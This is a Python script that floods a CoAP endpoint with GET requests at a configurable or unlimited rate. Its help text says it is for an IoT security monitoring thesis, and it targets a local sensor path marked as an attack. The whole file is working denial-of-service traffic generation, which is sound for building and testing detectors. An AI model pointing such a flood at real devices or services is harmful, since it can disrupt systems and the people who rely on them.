import argparse
import asyncio
import time

import aiocoap


# ============================
# ARGUMENTS
# ============================
parser = argparse.ArgumentParser(description="CoAP Flood Client for IoT Security Monitoring TA")
parser.add_argument("--rate", type=float, default=100, help="Target request per second. Use 0 for unlimited.")
parser.add_argument("--duration", type=float, default=0, help="Duration in seconds. Use 0 for unlimited until CTRL+C.")
parser.add_argument("--concurrency", type=int, default=100, help="Maximum concurrent CoAP requests.")
args = parser.parse_args()


# ============================
# CONFIG
# ============================
URI = "coap://localhost:5683/sensor/temp?attack"

RATE = args.rate
DURATION = args.duration
CONCURRENCY = args.concurrency

count_success = 0
count_error = 0
start_time = None


async def send_request(context, semaphore):
    global count_success, count_error

    async with semaphore:
        request = aiocoap.Message(
            code=aiocoap.GET,
            uri=URI
        )

        try:
            await context.request(request).response
            count_success += 1

        except Exception:
            count_error += 1


async def stats_printer():
    while True:
        await asyncio.sleep(1)

        elapsed = time.time() - start_time if start_time else 0
        total = count_success + count_error
        avg_rate = total / elapsed if elapsed > 0 else 0

        print(
            f"[COAP FLOOD] total={total} | success={count_success} | "
            f"error={count_error} | avg_rate={avg_rate:.2f} req/s",
            flush=True
        )


async def main():
    global start_time

    context = await aiocoap.Context.create_client_context()
    semaphore = asyncio.Semaphore(CONCURRENCY)

    start_time = time.time()
    next_send_time = start_time

    print("[COAP FLOOD] Started")
    print(f"URI         : {URI}")
    print(f"Rate        : {'unlimited' if RATE == 0 else str(RATE) + ' req/s'}")
    print(f"Duration    : {'unlimited' if DURATION == 0 else str(DURATION) + ' seconds'}")
    print(f"Concurrency : {CONCURRENCY}")
    print("Stop        : CTRL + C")

    asyncio.create_task(stats_printer())

    try:
        while True:
            now = time.time()

            if DURATION > 0 and (now - start_time) >= DURATION:
                break

            asyncio.create_task(send_request(context, semaphore))

            # RATE = 0 berarti unlimited, tidak ada sleep
            if RATE > 0:
                next_send_time += 1.0 / RATE
                sleep_time = next_send_time - time.time()

                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
                else:
                    next_send_time = time.time()
            else:
                await asyncio.sleep(0)

    except KeyboardInterrupt:
        print("\n[COAP FLOOD] Stopped by user")

    finally:
        await asyncio.sleep(1)

        elapsed = time.time() - start_time
        total = count_success + count_error
        avg_rate = total / elapsed if elapsed > 0 else 0

        print(
            f"[COAP FLOOD] Total={total} | success={count_success} | "
            f"error={count_error} | elapsed={elapsed:.2f}s | avg_rate={avg_rate:.2f} req/s"
        )


if __name__ == "__main__":
    asyncio.run(main())